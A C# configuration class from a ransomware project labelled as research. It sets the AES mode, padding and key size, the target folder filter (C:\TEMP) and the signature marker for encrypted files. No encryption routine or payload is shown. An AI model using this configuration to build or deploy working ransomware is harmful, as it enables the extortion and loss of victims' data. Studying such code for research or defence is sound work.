/************************************************************************************************************
 * This code is created and maintened only for a research proposal. Please do not use for other proposes.   *
 * Author: Th3 0bservator                                                                                   *
 * Source: https://github.com/guibacellar/BisquillaRansomware                                               *
 * Site: https://www.theobservator.net                                                                      *
 ************************************************************************************************************/

using System.Security.Cryptography;

namespace BisquillaRansomware
{
    /// <summary>
    /// Contains Main Configuration.
    /// This is a Partial Class. Other Values and Some elements you will find in ConfigurationManagerPartialGenerated.tf generator
    /// </summary>
    public partial class ConfigurationManager
    {
        private ConfigurationManager() { }

        /// <summary>
        /// AES Padding Mode - CAN BE CHANGED
        /// </summary>
        public const PaddingMode CHIPER_PADDING_MODE = PaddingMode.PKCS7;

        /// <summary>
        /// AES Padding Mode - DO NOT CHANGE
        /// </summary>
        public const CipherMode CHIPER_MODE = CipherMode.CBC;

        /// <summary>
        /// AES Key Size - CAN BE CHANGED
        /// </summary>
        public const int CHIPER_KEY_SIZE = 256;

        /// <summary>
        /// Target Filter - CAN BE CHANGED
        /// </summary>
        public static readonly string[] TARGET_PATH_FILTER = new string[]
        {
            "C:\\TEMP"
        };

        /// <summary>
        /// File Signature - CAN BE CHANGED
        /// </summary>
        public static readonly byte[] FILE_SIGNATURE = new byte[] { 77, 55, 15, 11, 69, 24, 22, 158 };

        /// <summary>
        /// File Signature Size - DO NOT CHANGE
        /// </summary>
        public static readonly int FILE_SIGNATURE_SIZE = FILE_SIGNATURE.Length;

    }
}
